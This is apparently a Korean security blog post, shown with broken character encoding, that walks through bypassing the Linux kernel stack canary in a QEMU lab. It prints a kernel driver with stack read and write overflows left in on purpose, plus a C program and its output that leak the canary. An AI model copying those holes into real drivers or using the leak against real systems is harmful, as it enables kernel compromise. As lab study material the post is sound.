

<!DOCTYPE html>
<html lang="en" data-default-color-scheme=&#34;auto&#34;>



<head>
  <meta charset="UTF-8">
  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
  <link rel="icon" href="/img/favicon.png">
  <meta name="viewport"
        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  
  <meta name="theme-color" content="#2f4154">
  <meta name="description" content="">
  <meta name="author" content="G4EG4EGAE">
  <meta name="keywords" content="">
  
  <title>[Research] Linux Kernel Exploit - Bypassing SSP - Hexo</title>

  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />


  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />

  
    
    
      
      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
    
  

  
    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
  



<!-- ä¸»é¢˜ä¾èµ–çš„å›¾æ ‡åº“ï¼Œä¸è¦è‡ªè¡Œä¿®æ”¹ -->

<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">



<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">


<link  rel="stylesheet" href="/css/main.css" />

<!-- è‡ªå®šä¹‰æ ·å¼ä¿æŒåœ¨æœ€åº•éƒ¨ -->


  <script id="fluid-configs">
    var Fluid = window.Fluid || {};
    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
  </script>
  <script  src="/js/utils.js" ></script>
  <script  src="/js/color-schema.js" ></script>
<meta name="generator" content="Hexo 5.4.0"></head>


<body>
  <header style="height: 70vh;">
    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
  <div class="container">
    <a class="navbar-brand"
       href="/">&nbsp;<strong>G4EG4EG4E's TECHNOTE</strong>&nbsp;</a>

    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
            data-target="#navbarSupportedContent"
            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
      <div class="animated-icon"><span></span><span></span><span></span></div>
    </button>

    <!-- Collapsible content -->
    <div class="collapse navbar-collapse" id="navbarSupportedContent">
      <ul class="navbar-nav ml-auto text-center">
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/">
                <i class="iconfont icon-home-fill"></i>
                Home
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/archives/">
                <i class="iconfont icon-archive-fill"></i>
                Archives
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/categories/">
                <i class="iconfont icon-category-fill"></i>
                Categories
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/tags/">
                <i class="iconfont icon-tags-fill"></i>
                Tags
              </a>
            </li>
          
        
          
          
          
          
            <li class="nav-item">
              <a class="nav-link" href="/about/">
                <i class="iconfont icon-user-fill"></i>
                About
              </a>
            </li>
          
        
        
          <li class="nav-item" id="search-btn">
            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
                class="iconfont icon-search"></i>&nbsp;</a>
          </li>
        
        
          <li class="nav-item" id="color-toggle-btn">
            <a class="nav-link" target="_self">&nbsp;<i
                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
          </li>
        
      </ul>
    </div>
  </div>
</nav>

    <div class="banner" id="banner" parallax=true
         style="background: url('/img/default.png') no-repeat center center;
           background-size: cover;">
      <div class="full-bg-img">
        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
          <div class="page-header text-center fade-in-up">
            <span class="h2" id="subtitle" title="[Research] Linux Kernel Exploit - Bypassing SSP">
              
            </span>

            
              <div class="mt-3">
  
  
    <span class="post-meta">
      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
      <time datetime="2021-10-03 07:01" pubdate>
        October 3, 2021 am
      </time>
    </span>
  
</div>

<div class="mt-1">
  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-chart"></i>
      2.3k å­—
    </span>
  

  
    
    <span class="post-meta mr-2">
      <i class="iconfont icon-clock-fill"></i>
      
      
      45
       åˆ†é’Ÿ
    </span>
  

  
  
</div>

            
          </div>

          
        </div>
      </div>
    </div>
  </header>

  <main>
    
      

<div class="container-fluid nopadding-x">
  <div class="row nomargin-x">
    <div class="d-none d-lg-block col-lg-2"></div>
    <div class="col-lg-8 nopadding-x-md">
      <div class="container nopadding-x-md" id="board-ctn">
        <div class="py-5" id="board">
          <article class="post-content mx-auto">
            <!-- SEO header -->
            <h1 style="display: none">[Research] Linux Kernel Exploit - Bypassing SSP</h1>
            
            <div class="markdown-body">
              <h2 id="Research-Linux-Kernel-Exploit-Bypassing-SMAP"><a href="#Research-Linux-Kernel-Exploit-Bypassing-SMAP" class="headerlink" title="[Research] Linux Kernel Exploit - Bypassing SMAP"></a>[Research] Linux Kernel Exploit - Bypassing SMAP</h2><p><img src="/img/penguinshot.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="ì„œë¡ "><a href="#ì„œë¡ " class="headerlink" title="ì„œë¡ "></a>ì„œë¡ </h2><p>í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” Linux Kernel Basic ì‹œë¦¬ì¦ˆì˜ ì •ë³´ë¥¼ ê¸°ë°˜ìœ¼ë¡œ í•˜ì—¬ ë¦¬ëˆ…ìŠ¤ ì»¤ë„ì— ì ìš©ë˜ì–´ ìˆëŠ” ë³´í˜¸ê¸°ë²•(mitigation)ì„ í•˜ë‚˜ì”© ìš°íšŒí•˜ì—¬ ê³µê²©í•˜ëŠ” ê³¼ì •ì„ í¬ìŠ¤íŠ¸í•˜ë ¤ê³  í•œë‹¤. í•´ë‹¹ í¬ìŠ¤íŠ¸ì—ì„œëŠ” SSP ë³´í˜¸ê¸°ë²•ì„ ì£¼ì œë¡œ í•˜ì—¬ í•´ë‹¹ ë³´í˜¸ê¸°ë²•ì´ ì–´ë– í•œ ë³´í˜¸ê¸°ë²•ì¸ì§€ ì´í•´í•˜ê³  ì´ë¥¼ ìš°íšŒí•˜ì—¬ ê³µê²©í•˜ëŠ” ë°©ë²•ì„ ì‘ì„±í•˜ë ¤ê³  í•œë‹¤.</p>
</br>
</br>

<h2 id="SSP"><a href="#SSP" class="headerlink" title="SSP"></a>SSP</h2></br>

<p><img src="/img/canary.jpg" srcset="/img/loading.gif" lazyload></p>
</br>

<p><b>SSP(Stack Smashing Protector)</b>ì€ Stackì—ì„œì˜ ì§€ì •ëœ ë²„í¼ í¬ê¸° ì´ìƒì˜ ë°ì´í„°ê°€ ì…ë ¥ë˜ì–´ ì‹¤í–‰íë¦„ì´ ë³€ì¡°ë  ê²½ìš° ë²„í¼ì™€ Return Address ì‚¬ì´ì˜ ì„ì˜ì˜ ë‚œìˆ˜ê°’ì„ ì„¤ì •í•´ë‘ì–´ í•¨ìˆ˜ê°€ ì¢…ë£Œëœ í›„ í•´ë‹¹ í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•œ ì˜ì—­(Caller)ìœ¼ë¡œ ëŒì•„ê°€ê¸° ì´ì „ì— ì´ë¥¼ í™•ì¸í•˜ëŠ” ë³´í˜¸ê¸°ë²•ì„ ì˜ë¯¸í•œë‹¤.</p>
</br>

<p>ë‚˜ì—ê²Œ ìˆì–´ì„œëŠ” ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¼ëŠ” ì´ë¦„ìœ¼ë¡œ ë”ìš± ìµìˆ™í•˜ë‹¤. ì‚¬ì‹¤ í•´ë‹¹ ê¸°ë²•ì´ ì•„ì´ë””ì–´ëŠ” í•˜ë‚˜ì¸ë° ë³„ëª…(Stack Canary, Stack Cookie, Stack Guardâ€¦)ì€ ìš´ì˜ì²´ì œì— ë”°ë¼ì„œë„ ë‹¤ë¥´ê²Œ ë¶ˆë¦¬ì–´ì§€ê³  í•˜ë‹ˆê¹Œ ì´ë¦„ì´ ì¤‘ìš”í•œ ê²ƒ ë³´ë‹¤ ì•„ì´ë””ì–´ì— ì§‘ì¤‘í•˜ëŠ” ê²ƒì´ ì¢‹ì„ ê²ƒìœ¼ë¡œ íŒë‹¨ëœë‹¤. ì´ëŸ¬í•œ ì¸ì‚¬ì´íŠ¸ë¥¼ ë‚˜ë§Œì˜ ê²½í—˜ìœ¼ë¡œ ì œì‹œí•˜ê¸° ìœ„í•´ì„œ ì¬ë°ŒëŠ”(?) ë¶€ê°€ì„¤ëª…ì„ ë§ë¶™íˆê² ë‹¤.</p>
</br>

<p>ìƒë‹¨ì— ì œì‹œëœ ê·¸ë¦¼ì˜ ê²½ìš°ëŠ” ë²„ë“œë°•ìŠ¤(2018)ë¼ëŠ” ì˜í™”ì´ë‹¤. ì‚¬ëŒì´ ëˆˆìœ¼ë¡œ í™•ì¸í•  ìˆ˜ ì—†ëŠ” ê´´ë¬¼ì´ ë‚˜ì˜¤ëŠ” ì˜í™”ì¸ë° ìƒˆë¥¼ ë°ë¦¬ê³  ë‹¤ë‹ˆë©´ ìƒˆëŠ” ì´ëŸ¬í•œ ê´´ë¬¼ì„ ê°ì§€í•˜ëŠ” ì—­í• ì„ í•œë‹¤. ê´‘ì‚°ì—ì„œë„ ìœ ë…ê°€ìŠ¤ê°€ ë°œìƒí•˜ë©´ ì˜ˆì „ì—ëŠ” ì¹´ë‚˜ë¦¬ì•„ë¥¼ ì´ìš©í•´ì„œ ìœ„í—˜ì„±ì„ ê°ì§€í•˜ê³  ëŒ€í”¼í•˜ì˜€ë‹¤ê³  í•œë‹¤. ê·¸ë˜ì„œ ì†Œí”„íŠ¸ì›¨ì–´ ì…ì¥ì—ì„œëŠ” ê³µê²©ìƒí™©ì— ëŒ€í•œ ê°ì§€ë¡œ ìŠ¤íƒì— ìˆëŠ” ì¹´ë‚˜ë¦¬ì•„ë¼ê³  ë¶ˆë¦°ë‹¤ê³  ì´ë¦„ì„ ë“¤ì—ˆë˜ ê²ƒ ê°™ë‹¤. ì œì¼ í¥ë¯¸ë¡œìš´ ì´ë¦„ìœ¼ë¡œ ì§€ì •ë˜ì—ˆìœ¼ë‹ˆê¹Œ ì•ìœ¼ë¡œëŠ” ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¼ê³  ë¶€ë¥´ê² ë‹¤.</p>
</br>

<p>ì‹¤ì œ êµ¬í˜„ì›ë¦¬ëŠ” ë§¤ìš° ì§ê´€ì ì´ë©° ê°„ë‹¨í•˜ë‹¤. ë²„í¼ì™€ Return Address ì‚¬ì´ì˜ ì„ì˜ì˜ ë‚œìˆ˜ê°’ì„ ì„¤ì •í•´ë‘ì–´ ì´ë¥¼ í™•ì¸í•˜ëŠ” ì›ë¦¬ì´ë‹¤. ê·¸ë ‡ë‹¤ë©´ ìŠ¤íƒ ê¸°ë°˜ì—ì„œ ì˜¤ë²„ í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ê¸° ì´ì „ <u>ìŠ¤íƒ ì¹´ë‚˜ë¦¬ì˜ ê°’ì„ ê³µê²©ìê°€ ì•Œ ìˆ˜ ìˆëŠ” í™˜ê²½</u>ì´ë¼ê³  í•˜ë©´ ì´ë¥¼ ê³ ë ¤í•˜ì—¬ ì˜¤ë²„ í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ë©´ ë˜ëŠ” ê²ƒì´ë‹¤.</p>
<p></br></br></p>
<h2 id="í™˜ê²½ë¶„ì„"><a href="#í™˜ê²½ë¶„ì„" class="headerlink" title="í™˜ê²½ë¶„ì„"></a>í™˜ê²½ë¶„ì„</h2><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><pre><code>qemu-system-x86_64 \
-m 512M \
-kernel ./bzImage \
-initrd  ./rootfs.cpio \
-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet nokaslr&quot; \
-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \
-nographic  \
-cpu qemu64,smep,smap \
</code></pre>
<p>ë¶€íŒ… ìŠ¤í¬ë¦½íŠ¸ì˜ ê²½ìš° ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœë¡œ ì‘ì„±ë˜ì–´ ìˆë‹¤. ì ìš©ëœ ë³´í˜¸ê¸°ë²•ì„ í™•ì¸í•´ë³´ë©´ KASLRì˜ ê²½ìš°ëŠ” ë¹„í™œì„±í™” í•´ë‘ì—ˆìœ¼ë©° SMEPê³¼ SMAPì˜ ê²½ìš°ëŠ” í™œì„±í™” ë˜ì–´ ìˆë‹¤. </p>
<p>í™˜ê²½ë¶„ì„ì—ì„œëŠ” ê¸°ì¬í•  ìˆ˜ ì—†ì§€ë§Œ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì»´íŒŒì¼ í•  ê²½ìš° ê¸°ë³¸ì ìœ¼ë¡œ SSPê°€ í™œì„±í™”ë˜ì–´ ì»´íŒŒì¼ë˜ë¯€ë¡œ ëª¨ë“  í•¨ìˆ˜ ì—í•„ë¡œê·¸ì—ì„œ Stack Canaryê°€ ì˜¤ì—¼ë˜ì—ˆëŠ” ì§€ í™•ì¸í•˜ëŠ” ë¡œì§ì´ ìë™ì ìœ¼ë¡œ ì¶”ê°€ëœë‹¤.</p>
<p></br></br></p>
<h2 id="ë°”ì´ë„ˆë¦¬-ë¶„ì„"><a href="#ë°”ì´ë„ˆë¦¬-ë¶„ì„" class="headerlink" title="ë°”ì´ë„ˆë¦¬ ë¶„ì„"></a>ë°”ì´ë„ˆë¦¬ ë¶„ì„</h2><h3 id="ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ"><a href="#ë””ë°”ì´ìŠ¤-ë“œë¼ì´ë²„-ì†ŒìŠ¤ì½”ë“œ" class="headerlink" title="ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ"></a>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ ì†ŒìŠ¤ì½”ë“œ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;linux/input.h&gt;<br>#include &lt;linux/module.h&gt;<br>#include &lt;linux/init.h&gt;<br>#include &lt;linux/kernel.h&gt;<br>#include &lt;linux/miscdevice.h&gt;<br>#include &lt;linux/device.h&gt;<br>#include &lt;linux/slab.h&gt;<br>#include &lt;linux/uaccess.h&gt;<br>#include &lt;linux/string.h&gt;<br><br>MODULE_LICENSE(&quot;Dual BSD/GPL&quot;);<br>MODULE_AUTHOR(&quot;SAMPLE&quot;);<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos);<br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos);<br><br>struct file_operations test_fops = &#123;<br>    .read   = test_read,<br>    .write  = test_write,<br>&#125;;<br><br>static struct miscdevice test_driver = &#123;<br>    .minor = MISC_DYNAMIC_MINOR,<br>    .name = &quot;test&quot;,<br>    .fops = &amp;test_fops,<br>&#125;;<br><br>static ssize_t test_read(struct file *filp, char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kzalloc(count, GFP_KERNEL);<br>    memcpy(ptr, arr, count);<br><br>    copy_to_user(buf, ptr, count);<br><br>    return 0;<br>&#125;<br><br><br>static ssize_t test_write(struct file *filp, const char __user *buf, size_t count, loff_t *f_pos) &#123;<br>    char arr[8] = &#123; [0 ... 7] = 0 &#125;;<br>    char *ptr;<br><br>    ptr = (char *)kmalloc(count, GFP_KERNEL);<br><br>    copy_from_user(ptr, buf, count);<br>    memcpy(arr, ptr, count);<br>    <br>    printk(&quot;arr : %x&quot;, arr[count-1]); <br><br>    return 0;<br>&#125;<br><br><br>static int test_init(void) &#123;<br>    int result;<br><br>    result = misc_register(&amp;test_driver);<br><br>    return 0;<br>&#125;<br><br>static void test_exit(void) &#123;<br>    misc_deregister(&amp;test_driver);<br>&#125;<br><br>module_init(test_init);<br>module_exit(test_exit);<br></code></pre></td></tr></table></figure>

<p>í•´ë‹¹ ì†ŒìŠ¤ì½”ë“œì˜ ê²½ìš° ê³µê²© ë²¡í„°(attack vector)ê°€ ë  ìˆ˜ ìˆëŠ” ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì˜ ì†ŒìŠ¤ì½”ë“œì´ë‹¤. ì†ŒìŠ¤ì½”ë“œë¥¼ í™•ì¸í•´ë³¼ ê²½ìš° file_operations êµ¬ì¡°ì²´ ë‚´ë¶€ì—ì„œ read, write ì‹œìŠ¤í…œ ì½œì— ëŒ€ì‘í•˜ëŠ” ë™ì‘ë“¤ì„ ì •ì˜í•˜ê³  ìˆë‹¤.</p>
<p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì„ í† ëŒ€ë¡œ read ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° test_read() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²½ìš° line33ì— ì˜í•˜ì—¬ ì»¤ë„ì—ì„œ ë©”ëª¨ë¦¬ë¥¼ ë™ì í• ë‹¹í•œ í›„ ì»¤ë„ì˜ ìŠ¤íƒ ë²„í¼ì— ìˆëŠ” ë°ì´í„°ë¥¼ ë³µì‚¬í•´ì˜¤ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ë¡œì§ì—ì„œ ê°’ì„ ë³µì‚¬í•˜ëŠ” countê°€ ê³µê²©ìê°€ ì„ì˜ë¡œ ë³€ê²½í•  ìˆ˜ ìˆê¸° ë•Œë¬¸ì— ì»¤ë„ ìŠ¤íƒ ë²„í¼ì— ìˆëŠ” ê°’ë“¤ì„ leakí•  ìˆ˜ ìˆë‹¤. í•´ë‹¹ ì‹œìŠ¤í…œ í˜¸ì¶œì„ í†µí•´ì„œ stack canaryë¥¼ ì•Œ ìˆ˜ ìˆë‹¤. </p>
<p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ íŒŒì¼ì„ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•˜ê²Œ ë  ê²½ìš° test_wrtie() í•¨ìˆ˜ê°€ ì‹¤í–‰ëœë‹¤. í•´ë‹¹ í•¨ìˆ˜ê°€ ì‹¤í–‰ë  ê²½ìš° line48ì— ì˜í•˜ì—¬ ìœ ì €ì˜ì—­ì˜ ë©”ëª¨ë¦¬ë¥¼ ì»¤ë„ì˜ ìŠ¤íƒë²„í¼ì— ë³µì‚¬í•˜ê¸°ì— ì´ë¥¼ í†µí•œ ë©”ëª¨ë¦¬ ì˜¤ì—¼(memory corruption)ì´ ê°€ëŠ¥í•˜ë‹¤. ê²°ê³¼ì ìœ¼ë¡œ return addressë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŒìœ¼ë¡œ ì‹¤í–‰ íë¦„ì˜ ë³€ì¡°ê°€ ê°€ëŠ¥í•  ê²ƒìœ¼ë¡œ ë³´ì—¬ì§„ë‹¤.</p>
<p></br></br></p>
<h2 id="ì·¨ì•½ì -ë¶„ì„"><a href="#ì·¨ì•½ì -ë¶„ì„" class="headerlink" title="ì·¨ì•½ì  ë¶„ì„"></a>ì·¨ì•½ì  ë¶„ì„</h2><p><b>ë°”ì´ë„ˆë¦¬ ë¶„ì„</b>ì—ì„œ ì‚¬ìš©ìì˜ ì…ë ¥ìœ¼ë¡œ ë¶€í„° ì»¤ë„ ìŠ¤íƒì˜ ì •ë³´ë¥¼ ì•Œ ìˆ˜ ìˆìœ¼ë©° ì‹¤í–‰íë¦„ì„ ë³€ì¡°í•  ê°€ëŠ¥ì„±ì´ ìˆìŒì„ í™•ì¸í•˜ì˜€ë‹¤. í•´ë‹¹ ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ í† ëŒ€ë¡œ write ì‹œìŠ¤í…œ ì½œì´ í˜¸ì¶œë˜ê²Œ ë  ê²½ìš° ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ ê²½ìš° ì‚¬ìš©ìì˜ ì…ë ¥(untrusted input)ì´ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¥¼ ë°œìƒì‹œí‚¤ê¸° ë•Œë¬¸ì´ë‹¤. ì˜ˆìƒí•œ ê²°ê³¼ê°€ ë§ëŠ”ê°€ì— ëŒ€í•´ì„œ í™•ì¸í•´ë³¼ í•„ìš”ê°€ ìˆë‹¤.</p>
</br>

<h3 id="ê³µê²©-ì½”ë“œ-1"><a href="#ê³µê²©-ì½”ë“œ-1" class="headerlink" title="ê³µê²© ì½”ë“œ(1)"></a>ê³µê²© ì½”ë“œ(1)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs &#123;c&#125;">#include &lt;stdio.h&gt;<br>#include &lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;sys/stat.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdint.h&gt;<br><br>int main() &#123;<br>    int fd;<br>    size_t *canary[6] = &#123;0, &#125;;<br><br><br>    fd = open(&quot;/dev/test&quot;, O_RDWR);<br><br>    read(fd, canary, sizeof(canary));<br>    <br>    printf(&quot;canary[0] = %lx\n&quot;, canary[0]);<br>    printf(&quot;canary[1] = %lx\n&quot;, canary[1]);<br>    printf(&quot;canary[2] = %lx\n&quot;, canary[2]);<br>    printf(&quot;canary[3] = %lx\n&quot;, canary[3]);<br>    printf(&quot;canary[4] = %lx\n&quot;, canary[4]);<br>    printf(&quot;canary[5] = %lx\n&quot;, canary[5]);<br><br><br>    close(fd);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ë¥¼ ì œì–´í•˜ëŠ” ì½”ë“œë¥¼ ì‘ì„±í•˜ì˜€ë‹¤. ë””ë°”ì´ìŠ¤ì— í•´ë‹¹í•˜ëŠ” íŒŒì¼ì„ í†µí•´ read ì‹œìŠ¤í…œ ì½œì„ í˜¸ì¶œí•¨ì„ í†µí•´ì„œ ì»¤ë„ ìŠ¤íƒì˜ ì •ë³´ë¥¼ ìœ ì¶œ(leak)í•´ë³´ë ¤ê³  í•œë‹¤. ì´ 48ë°”ì´íŠ¸ í¬ê¸°ì˜ ë°ì´í„°ë¥¼ ì¶œë ¥í•´ë´„ìœ¼ë¡œ ì–´ë– í•œ ë¶€ë¶„ì´ ì¹´ë‚˜ë¦¬ë¡œ ì˜ˆìƒë  ì§€ ì¶œë ¥í•  ìˆ˜ ìˆë‹¤. ë””ë°”ì´ìŠ¤ ë“œë¼ì´ë²„ì˜ test_read() í•¨ìˆ˜ ë‚´ë¶€ì˜ ë²„í¼ì˜ í¬ê¸°ëŠ” 8ë°”ì´íŠ¸ì´ë¯€ë¡œ ì¶©ë¶„í•œ í¬ê¸°ì˜ ì •ë³´ë¥¼ ì¶œë ¥í•œë‹¤ëŠ” ê²ƒì„ ê°€ì •í•´ì„œ ì§„í–‰í•´ë³´ê² ë‹¤.</p>
</br>

<h3 id="ê³µê²©-ê²°ê³¼-1"><a href="#ê³µê²©-ê²°ê³¼-1" class="headerlink" title="ê³µê²© ê²°ê³¼(1)"></a>ê³µê²© ê²°ê³¼(1)</h3><pre><code>qemu-system-x86_64: warning: TCG doesn&#39;t support requested feature: CPUID.01H:ECX.vmx [bit 5]
/ $ ./leak 
canary[0] = 0
canary[1] = 7f78bbec01f33a00
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9ec900
/ $ ./leak 
canary[0] = 0
canary[1] = 875b1e91019ab700
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9eca00
/ $ ./leak 
canary[0] = 0
canary[1] = c24444f6245e5700
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9ecb00
/ $ ./leak 
canary[0] = 0
canary[1] = 92fb1f83c3973e00
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9ec900
/ $ ./leak 
canary[0] = 0
canary[1] = 2ed61794e0235300
canary[2] = 30
canary[3] = 1
canary[4] = ffffffff811e311b
canary[5] = ffff88801d9eca00
</code></pre>
<p>ì‘ì„±í•˜ì˜€ë˜ ì½”ë“œë¥¼ í† ëŒ€ë¡œ ì»¤ë„ ìŠ¤íƒ ë²„í¼ì— ìˆëŠ” ë°ì´í„°ë¥¼ ìœ ì¶œ(leak)í•´ë³¸ ê²°ê³¼ ë‹¤ìŒê³¼ ê°™ì€ í˜•íƒœì´ë‹¤. ì‚¬ì‹¤ ë””ë²„ê¹…ì„ ì§„í–‰í•˜ë©´ ì–´ë– í•œ ìœ„ì¹˜ê°€ ìŠ¤íƒ ì¹´ë‚˜ë¦¬ì— í•´ë‹¹í•˜ëŠ” ê°’ì¸ì§€ ëª…í™•íˆ ì•Œ ìˆ˜ ìˆì§€ë§Œ í˜„ì¬ì˜ ê²°ê³¼ë¥¼ ë³´ì•˜ì„ ë•Œ ì»¤ë„ ë²„í¼ì˜ ì‚¬ì´ì¦ˆëŠ” 8ì´ë©° ì´í›„ì˜ ê°’ë¶€í„° ê°€ì¥ ê·œì¹™ì„±ì„ ë„ì§€ ì•ŠëŠ” ìŠ¤íƒ ì¹´ë‚˜ë¦¬ë¼ê³  íŒë‹¨ë˜ëŠ” ê°’ì€ canary[1]ì— í•´ë‹¹í•˜ëŠ” ê°’ìœ¼ë¡œ íŒë‹¨ëœë‹¤. </p>
